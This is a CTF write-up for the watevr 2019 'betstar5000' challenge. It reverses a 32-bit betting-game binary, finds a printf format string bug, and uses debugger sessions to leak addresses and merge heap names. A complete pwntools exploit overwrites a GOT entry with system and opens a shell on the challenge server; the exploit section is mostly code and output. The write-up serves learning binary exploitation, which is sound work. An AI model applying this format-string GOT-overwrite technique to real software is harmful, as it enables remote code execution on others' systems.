# Watevr ctf 2019 betstar5000

This writeup goes out to noopnoop, for his eternal love of format strings.

Let's take a look at the binary / libc:

```
$    ./betstar5000
Welcome to the ultimate betting service.
Enter the amount of players: 1
Name: guy
Alright, now let's start!
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
$    file betstar5000
betstar5000: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0cea1b37b35e6e7002492e7b8ac6175882fb6212, stripped
$    pwn checksec betstar5000
[*] '/Hackery/watev/betstar/betstar5000'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./libc-2.27.so
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.3.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

So we can see the libc version is `2.27.so`. The binary appears to be a betting game. It allows us to make some players, add players later on, view the players names and score, and edit the player name.

We can see that the binary has `pie`, `NX`, and a stack canary. It is a `32` bit binary.

## Reversing

When we take a look at the function at pie offset `0xb17` in ghidra (although Ghidra rebases it to `0x10b17`) we see this:

```
/* WARNING: Function: __i686.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void basicallyMain(void)

{
  void **ptrz;
  uint __seed;
  void *innerPtr;
  int in_GS_OFFSET;
  time_t local_4c;
  undefined4 local_48;
  int players;
  int i;
  void *ptr;
  uint menuOption;
  char acStack46 [10];
  undefined4 local_24;
  undefined *puStack20;
 
  puStack20 = &stack0x00000004;
  local_24 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  __seed = time(&local_4c);
  srand(__seed);
  local_48 = 0;
  puts("Welcome to the ultimate betting service.");
  printf("%s","Enter the amount of players: ");
  fgets(acStack46,3,stdin);
  players = atoi(acStack46);
  ptr = malloc((players + 6) * 8);
  i = 0;
  while (i < players) {
    ptrz = (void **)(i * 8 + (int)ptr);
    innerPtr = malloc(4);
    *ptrz = innerPtr;
    printf("%s","Name: ");
    fgets(*(char **)((int)ptr + i * 8),10,stdin);
    strtok(*(char **)((int)ptr + i * 8),"\n");
    i = i + 1;
  }
  printf("%s","Alright, now let\'s start!");
  while( true ) {
    menuOption = getMenu();
    if (menuOption < 6) break;
    puts("I think you missed a key there");
  }
                    /* WARNING: Could not recover jumptable at 0x00010ca7. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)((int)&__DT_PLTGOT + *(int *)(&DAT_00011250 + menuOption * 4)))();
  return;
}
```

So we can see some things here regarding this binary. We see that it allocates some space, and allows us to write user names to it. We also see that that there is some sort of jump function happening at the end. While I reversed this, I found several different bugs. In addition to that there was a lot of functionality in the binary that I didn't reverse out fully. However due to the constraints of code, I only ended up using a single bug. That bug was within the function responsible for playing a game, at pie offset `0x831` (ghidra rebased it to `0x10831`):

```

/* WARNING: Function: __i686.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void playRound(int param_1)

{
  int numPlayers;
  int iVar1;
  char *__nptr;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int in_GS_OFFSET;
  int local_74;
  int local_70;
  int i;
  char local_5a [5];
  char local_55 [5];
  char acStack80 [64];
  int local_10;
 
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  fflush(stdout);
  printf("%s","Amount of players playing this round: ");
  fgets(local_5a,5,stdin);
  numPlayers = atoi(local_5a);
  puts("Each player makes a bet between 0 -> 100, the one who lands closest win the round!");
  iVar1 = rand();
  local_74 = -1;
  local_70 = 100;
  i = 0;
  while (i < numPlayers) {
    printf("%s",*(undefined4 *)(param_1 + i * 8));
    printf("\'s bet: ");
    __nptr = fgets(local_55,5,stdin);
    iVar2 = atoi(__nptr);
    uVar3 = (iVar1 % 100 + 1) - iVar2;
    uVar4 = (int)uVar3 >> 0x1f;
    if ((int)((uVar3 ^ uVar4) - uVar4) < local_70) {
      local_74 = i;
      strcpy(acStack80,*(char **)(param_1 + i * 8));
      local_70 = iVar2;
    }
    i = i + 1;
  }
  printf("%s","And the winner is *drumroll*: ");
  printf(acStack80);
  *(int *)(param_1 + local_74 * 8 + 4) = *(int *)(param_1 + local_74 * 8 + 4) + 1;
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    FUN_00010f80();
  }
  return;
}
```

We can see that there is a format string bug here:

```
  printf(acStack80);
```

Essentially this function works like this. You specify the number of players playing. Each player specifies a value between `0 - 100` that they are guessing. Whoever guesses closer wins. Whoever wins has their name printed in the printf statement above. Since we control the name, we control the input to the `printf` statement, hence we have a format string bug. In order to leverage this into `rce`, there are several different constraints we need to address.

## Exploitation

So my exploit worked like this. First off we get `pie` and `libc` infoleaks, so we know the address space for those two regions. After that we can just do a got overwrite over `atoi` with `system`. For the menu, our input is passed to `atoi`, and since `atoi` and `system` take the same arguments, we will be good. In addition to that `atoi` isn't called anywhere that will DOS the process.

## Infoleak

Let's take a look at how we are doing the `PIE` and `LIBC` infoleak.

```
gef➤  pie b *0x9df
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)
Welcome to the ultimate betting service.
Enter the amount of players: 1
Name: %x.%x
Alright, now let's start!
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
1
Amount of players playing this round: 1
Each player makes a bet between 0 -> 100, the one who lands closest win the round!
%x.%x's bet: 1

Breakpoint 1, 0x565559df in ?? ()
[+] base address 0x56555000
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd06c  →  "%x.%x"
$ebx   : 0x56557540  →  0x0000242c (",$"?)
$ecx   : 0x0       
$edx   : 0xf7fb6890  →  0x00000000
$esp   : 0xffffd020  →  0xffffd06c  →  "%x.%x"
$ebp   : 0xffffd0b8  →  0xffffd118  →  0x00000000
$esi   : 0x56558980  →  0x565589c0  →  "%x.%x"
$edi   : 0x0       
$eip   : 0x565559df  →   call 0x565555a0 <printf@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd020│+0x0000: 0xffffd06c  →  "%x.%x"     ← $esp
0xffffd024│+0x0004: 0x5655605c  →  "And the winner is *drumroll*:"
0xffffd028│+0x0008: 0xf7fb55c0  →  0xfbad2288
0xffffd02c│+0x000c: 0x565558d5  →   mov ecx, eax
0xffffd030│+0x0010: 0x00000001
0xffffd034│+0x0014: 0x00000000
0xffffd038│+0x0018: 0xf7e0f53b  →   add eax, 0x1a5ac5
0xffffd03c│+0x001c: 0x56558980  →  0x565589c0  →  "%x.%x"
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565559d8                  sub    esp, 0xc
   0x565559db                  lea    eax, [ebp-0x4c]
   0x565559de                  push   eax
 → 0x565559df                  call   0x565555a0 <printf@plt>
   ↳  0x565555a0 <printf@plt+0>   jmp    DWORD PTR [ebx+0x10]
      0x565555a6 <printf@plt+6>   push   0x8
      0x565555ab <printf@plt+11>  jmp    0x56555580
      0x565555b0 <fflush@plt+0>   jmp    DWORD PTR [ebx+0x14]
      0x565555b6 <fflush@plt+6>   push   0x10
      0x565555bb <fflush@plt+11>  jmp    0x56555580
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   [sp + 0x0] = 0xffffd06c → "%x.%x"
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "betstar5000", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565559df → call 0x565555a0 <printf@plt>
[#1] 0x56555ccb → add esp, 0x10
[#2] 0xf7df5e81 → __libc_start_main()
[#3] 0x565556c1 → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s 0x5655605c
0x5655605c:    "And the winner is *drumroll*: "
gef➤  x/w 0xf7fb55c0
0xf7fb55c0 <_IO_2_1_stdin_>:    U"\xfbad2288\x56558572\x56558572\x56558570\x56558570\x56558570\x56558570\x56558570\x56558970"
gef➤  c
Continuing.
And the winner is *drumroll*: 5655605c.f7fb55c0
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
```

So we can see the addresses the we leaked are `0x5655605c` (the string in the binary `And the winner is *drumroll*: `), and `0xf7fb55c0` (libc `STDIN`). Notice how these addresses are the first two addresses we can leak with the fmt string `%x.%x`, and that these two addresses are the first two values below our format strin `%x.%x`, which is at the top of the stack. This isn't a coincidence. We can reliably use this as a remote infoleak for both `PIE` and `libc`. We can find the offsets from those values to the libc/pie bases like this:

```
gef➤  vmmap
Start      End        Offset     Perm Path
0x56555000 0x56557000 0x00000000 r-x /home/guyinatuxedo/Desktop/betstar/betstar5000
0x56557000 0x56558000 0x00001000 rw- /home/guyinatuxedo/Desktop/betstar/betstar5000
0x56558000 0x5657a000 0x00000000 rw- [heap]
0xf7ddd000 0xf7fb2000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.27.so
0xf7fb2000 0xf7fb3000 0x001d5000 --- /lib/i386-linux-gnu/libc-2.27.so
0xf7fb3000 0xf7fb5000 0x001d5000 r-- /lib/i386-linux-gnu/libc-2.27.so
0xf7fb5000 0xf7fb6000 0x001d7000 rw- /lib/i386-linux-gnu/libc-2.27.so
0xf7fb6000 0xf7fb9000 0x00000000 rw-
0xf7fd0000 0xf7fd2000 0x00000000 rw-
0xf7fd2000 0xf7fd5000 0x00000000 r-- [vvar]
0xf7fd5000 0xf7fd6000 0x00000000 r-x [vdso]
0xf7fd6000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 0x00025000 r-- /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 0x00026000 rw- /lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

A bit of python math:

```
>>> hex(0x5655605c - 0x56555000)
'0x105c'
>>> hex(0xf7fb55c0 - 0xf7ddd000)
'0x1d85c0'
```

## Setting up the fmt string

Now that we have the infoleaks, the only thing left is to set up the format strings. However in order to do this, we will need to jump through some hoops first. When I was trying to land this bug, I had some issues with the size constraints on the format string. In order to get the amount of characters to the vulnerable `printf` in order to do the got overwrite properly, I had to exploit some other bugs. Essentially we will merge two names together, to give us one large name which will act us our format string.

First let's take a look at the memory layout of the names, so we can see exactly what the issues are:

```
gef➤  r
Starting program: /home/guyinatuxedo/Desktop/betstar/betstar5000
Welcome to the ultimate betting service.
Enter the amount of players: 0
Alright, now let's start!
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
3
Welcome new player!
Please enter your name: 00000000000000000

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
3
Welcome new player!
Please enter your name: 11111111111111111

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
3
Welcome new player!
Please enter your name: 22222222222222222

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
3
Welcome new player!
Please enter your name: 33333333333333333

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
3
Welcome new player!
Please enter your name: 44444444444444444

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
2
Player 000000000000 currently has 0 points.
Player 111111111111 currently has 0 points.
Player 222222222222 currently has 0 points.
Player 333333333333 currently has 0 points.
Player 44444444444444444 currently has 0 points.

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
```

When we take a look at the actual memory layout of the names:

```
gef➤  search-pattern 0000000
[+] Searching '0000000' in memory
[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
  0x565589c0 - 0x565589c7  →   "0000000[...]"
[+] In '/lib/i386-linux-gnu/libc-2.27.so'(0xf7ddd000-0xf7fb2000), permission=r-x
  0xf7f5633c - 0xf7f5634c  →   "0000000000000000"
  0xf7f56343 - 0xf7f5634c  →   "000000000"
gef➤  x/40x 0x565589b0
0x565589b0:    0x00000000    0x00000000    0x00000000    0x00000011
0x565589c0:    0x30303030    0x30303030    0x30303030    0x00000011
0x565589d0:    0x31313131    0x31313131    0x31313131    0x00000011
0x565589e0:    0x32323232    0x32323232    0x32323232    0x00000011
0x565589f0:    0x33333333    0x33333333    0x33333333    0x00000011
0x56558a00:    0x34343434    0x34343434    0x34343434    0x34343434
0x56558a10:    0x00000034    0x00000000    0x00000000    0x00000000
0x56558a20:    0x00000000    0x00000000    0x00000000    0x00000000
0x56558a30:    0x00000000    0x00000000    0x00000000    0x00000000
0x56558a40:    0x00000000    0x00000000    0x00000000    0x00000000
```

So our names are stored in the heap (however the name that is being passed to the format string is copied to the stack prior to the call). So for our names, we can see that the space allocated for them is overflowed. Then when we allocate additional heap chunks the header essentially truncates the name after `12` bytes. So every name before our last name is only `12` bytes long. We will merge the strings using the edit player name functionality. First off we will edit one name with a value of `17` non-null bytes. This will overflow 1 byte into the next name. Now all of the names are null terminated, and when we do this, the null terminator will end up on the second byte of the name which is being overflowed.

```
gef➤  c
Continuing.
4
Which player index should i change:
2
Enter new name: 55555555555555555

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
I think you missed a key there

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0x56558570  →  "55555555555555555"
$edx   : 0x400     
$esp   : 0xffffcf50  →  0xffffcfb8  →  0x00000003
$ebp   : 0xffffcfb8  →  0x00000003
$esi   : 0xf7fb55c0  →  0xfbad2288
$edi   : 0xf7fb5000  →  0x001d7d6c ("l}"?)
$eip   : 0xf7fd5949  →  <__kernel_vsyscall+9> pop ebp
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf50│+0x0000: 0xffffcfb8  →  0x00000003     ← $esp
0xffffcf54│+0x0004: 0x00000400
0xffffcf58│+0x0008: 0x56558570  →  "55555555555555555"
0xffffcf5c│+0x000c: 0xf7ec3cd7  →  0xfff0003d ("="?)
0xffffcf60│+0x0010: 0xf7fb55c0  →  0xfbad2288
0xffffcf64│+0x0014: 0xf7fb3860  →  0x00000000
0xffffcf68│+0x0018: 0xf7e502f9  →  <_IO_file_overflow+9> add edx, 0x164d07
0xffffcf6c│+0x001c: 0xf7fb3860  →  0x00000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd5943 <__kernel_vsyscall+3> mov    ebp, ecx
   0xf7fd5945 <__kernel_vsyscall+5> syscall
   0xf7fd5947 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd5949 <__kernel_vsyscall+9> pop    ebp
   0xf7fd594a <__kernel_vsyscall+10> pop    edx
   0xf7fd594b <__kernel_vsyscall+11> pop    ecx
   0xf7fd594c <__kernel_vsyscall+12> ret    
   0xf7fd594d                  nop    
   0xf7fd594e                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "betstar5000", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd5949 → __kernel_vsyscall()
[#1] 0xf7ec3cd7 → read()
[#2] 0xf7e50188 → _IO_file_underflow()
[#3] 0xf7e512ab → _IO_default_uflow()
[#4] 0xf7e44151 → _IO_getline_info()
[#5] 0xf7e4429e → _IO_getline()
[#6] 0xf7e4304c → fgets()
[#7] 0x56555ae9 → add esp, 0x10
[#8] 0x56555c8f → mov DWORD PTR [ebp-0x30], eax
[#9] 0xf7df5e81 → __libc_start_main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
0xf7fd5949 in __kernel_vsyscall ()
gef➤  x/40x 0x565589b0
0x565589b0:    0x00000000    0x00000000    0x00000000    0x00000011
0x565589c0:    0x30303030    0x30303030    0x30303030    0x00000011
0x565589d0:    0x31313131    0x31313131    0x31313131    0x00000011
0x565589e0:    0x35353535    0x35353535    0x35353535    0x35353535
0x565589f0:    0x33330035    0x33333333    0x33333333    0x00000011
0x56558a00:    0x34343434    0x34343434    0x34343434    0x34343434
0x56558a10:    0x00000034    0x00000000    0x00000000    0x00000000
0x56558a20:    0x00000000    0x00000000    0x00000000    0x00000000
0x56558a30:    0x00000000    0x00000000    0x00000000    0x00000000
0x56558a40:    0x00000000    0x00000000    0x00000000    0x00000000
```

Now to get rid of the null byte, we will just update the overflowed name with a new value. This will get rid of the null byte, and effectively merge the two names.

```
gef➤  x/40x 0x565589b0
0x565589b0:    0x00000000    0x00000000    0x00000000    0x00000011
0x565589c0:    0x30303030    0x30303030    0x30303030    0x00000011
0x565589d0:    0x31313131    0x31313131    0x31313131    0x00000011
0x565589e0:    0x35353535    0x35353535    0x35353535    0x35353535
0x565589f0:    0x33330035    0x33333333    0x33333333    0x00000011
0x56558a00:    0x34343434    0x34343434    0x34343434    0x34343434
0x56558a10:    0x00000034    0x00000000    0x00000000    0x00000000
0x56558a20:    0x00000000    0x00000000    0x00000000    0x00000000
0x56558a30:    0x00000000    0x00000000    0x00000000    0x00000000
0x56558a40:    0x00000000    0x00000000    0x00000000    0x00000000
gef➤  c
Continuing.
4
Which player index should i change:
3
Enter new name: 66666666666666666

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
I think you missed a key there

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
2
Player 000000000000 currently has 0 points.
Player 111111111111 currently has 0 points.
Player 555555555555555566666666666666666 currently has 0 points.
Player 66666666666666666 currently has 0 points.
Player 6 currently has 0 points.

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
```

Now when we do this for our format string, we will just write the first `17` characters of the format string to the first character, then the rest of the characters to the second name.

## Executing the format string

Now when we execute the format string, we first calculate the got address of `atoi`, and the libc address of `system`. Then we just calculate the value we need to write, and print that many bytes. You can look at the exploit for how exactly this works.

Now for where the start of our input will end up on the stack with relation to the format string, we can see specifically that they will end up at spot `19`:

```
gef➤  pie b *0x9df
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)
Welcome to the ultimate betting service.
Enter the amount of players: 0
Alright, now let's start!
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
3
Welcome new player!
Please enter your name: 0000.%19$x

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
1
Amount of players playing this round: 1
Each player makes a bet between 0 -> 100, the one who lands closest win the round!
0000.%19$x's bet: 1

Breakpoint 1, 0x565559df in ?? ()
[+] base address 0x56555000
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd06c  →  "0000.%19$x"
$ebx   : 0x56557540  →  0x0000242c (",$"?)
$ecx   : 0x0       
$edx   : 0xf7fb6890  →  0x00000000
$esp   : 0xffffd020  →  0xffffd06c  →  "0000.%19$x"
$ebp   : 0xffffd0b8  →  0xffffd118  →  0x00000000
$esi   : 0x56558980  →  0x565589c0  →  "0000.%19$x"
$edi   : 0x0       
$eip   : 0x565559df  →   call 0x565555a0 <printf@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd020│+0x0000: 0xffffd06c  →  "0000.%19$x"     ← $esp
0xffffd024│+0x0004: 0x5655605c  →  "And the winner is *drumroll*:"
0xffffd028│+0x0008: 0xf7fb55c0  →  0xfbad2288
0xffffd02c│+0x000c: 0x565558d5  →   mov ecx, eax
0xffffd030│+0x0010: 0x00000001
0xffffd034│+0x0014: 0x00000000
0xffffd038│+0x0018: 0xf7e0f53b  →   add eax, 0x1a5ac5
0xffffd03c│+0x001c: 0x56558980  →  0x565589c0  →  "0000.%19$x"
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565559d8                  sub    esp, 0xc
   0x565559db                  lea    eax, [ebp-0x4c]
   0x565559de                  push   eax
 → 0x565559df                  call   0x565555a0 <printf@plt>
   ↳  0x565555a0 <printf@plt+0>   jmp    DWORD PTR [ebx+0x10]
      0x565555a6 <printf@plt+6>   push   0x8
      0x565555ab <printf@plt+11>  jmp    0x56555580
      0x565555b0 <fflush@plt+0>   jmp    DWORD PTR [ebx+0x14]
      0x565555b6 <fflush@plt+6>   push   0x10
      0x565555bb <fflush@plt+11>  jmp    0x56555580
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   [sp + 0x0] = 0xffffd06c → "0000.%19$x"
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "betstar5000", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565559df → call 0x565555a0 <printf@plt>
[#1] 0x56555ccb → add esp, 0x10
[#2] 0xf7df5e81 → __libc_start_main()
[#3] 0x565556c1 → hlt
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Now for our format string spot `1` is `0xffffd024`. Spot `19` would be `0xffffd024 + (4*18) = 0xffffd06c`:

```
gef➤  x/w 0xffffd06c
0xffffd06c:    0x30303030
gef➤  c
Continuing.
And the winner is *drumroll*: 0000.30303030
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
```

Also one last thing. I didn't reverse out the functionality for the guessing game, however I found a way to reliably pick which player won. For this just give each of the non winning characters a number as close to `100` as possible, while giving the player you want to win the number `1`.

## Exploit

With that, we can put together the following exploit:

```
from pwn import *

#target = process("./betstar5000")
target = remote("13.53.69.114", 50000)
#gdb.attach(target)

elf = ELF("betstar5000")
libc = ELF("libc-2.27.so")


def getMenu():
    print target.recvuntil("5. End the game")

def getLeaks():
    getMenu()
    target.sendline("1")# menu
    target.sendline("1")
    target.sendline("1")
    print target.recvuntil("And the winner is *drumroll*: ")
    leak = target.recvline().strip("\n")
    return leak

def addPlayer(name):
    getMenu()
    target.sendline("3")
    raw_input()
    target.sendline(name)

def editPlayer(index, name):
    target.sendline("4")
    raw_input()

    target.sendline(str(index))
    raw_input()

    target.sendline(name)


# Get infoleaks, calculate needed addresses

target.sendline("1")
target.sendline("%x.%x")

leak = getLeaks()

pieBase = int(leak.split(".")[0], 16) - 0x105c
libcBase = int(leak.split(".")[1], 16) - 0x1d85c0
mallocHook = libcBase + libc.symbols["__malloc_hook"]
system = libcBase + libc.symbols["system"]
strtok = pieBase + 0x2584

print "pie base is: " + hex(pieBase)
print "libc base is: " + hex(libcBase)
print "malloc hook is: " + hex(mallocHook)
print "strtok: " + hex(strtok)
print "printf: " + hex(pieBase + 0x9df)

# Calculate the amount of bytes we need to print for the fmt string write

x = (system & 0xffff) - 8
y = ((system & 0xffff0000) >> 16) - (system & 0xffff)

# Make the fmt string

noop = p32(strtok) + p32(strtok + 2) + "%" + str(x) + "x%19$n" + "%" + str(y) + "x%20$n"

# Add two new players
filler = "0"*12

for i in range(0, 2):
    addPlayer(filler)

editPlayer(1, noop[0:17])
editPlayer(2, noop[16:])

# Get our fmt string to the vulnerable printf call

target.sendline("1")
target.sendline("2")
target.sendline("100")

target.sendline("1")

# Send 'sh' to be our argument to system, to get our shell

target.sendline("sh")

# Enjoy your shell

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Opening connection to 13.53.69.114 on port 50000: Done
[*] '/Hackery/watev/betstar/betstar5000'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/Hackery/watev/betstar/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Welcome to the ultimate betting service.
Enter the amount of players: Name: Alright, now let's start!
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game

Amount of players playing this round: Each player makes a bet between 0 -> 100, the one who lands closest win the round!
%x.%x's bet: And the winner is *drumroll*:
pie base is: 0x565ff000
libc base is: 0xf7d87000
malloc hook is: 0xf7f5f788
strtok: 0x56601584
printf: 0x565ff9df
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game


Welcome new player!
Please enter your name:
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game





[*] Switching to interactive mode

Welcome new player!
Please enter your name:
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
Which player index should i change:
Enter new name:
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
I think you missed a key there

1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
Which player index should i change:
Enter new name:
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
Amount of players playing this round: Each player makes a bet between 0 -> 100, the one who lands closest win the round!
%x.%x's bet: \x84\x15`V\x86\x15`V%16888x%19$n%46556x%20$n's bet: And the winner is *drumroll*: \x84\x15`V\x86\x15`V
```

After all the bytes that get printed for the fmt string:

```
                      f7f5f5c0
1. Play a round
2. View scores
3. Add a latecommer
4. Edit player name
5. End the game
$ w
 20:39:59 up 2 days,  1:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd /home/ctf
$ ls
flag.txt
service
$ cat flag.txt
watevr{i_G0Tta_f33ling_https://www.youtube.com/watch?v=uSD4vsh1zDA}
$  
```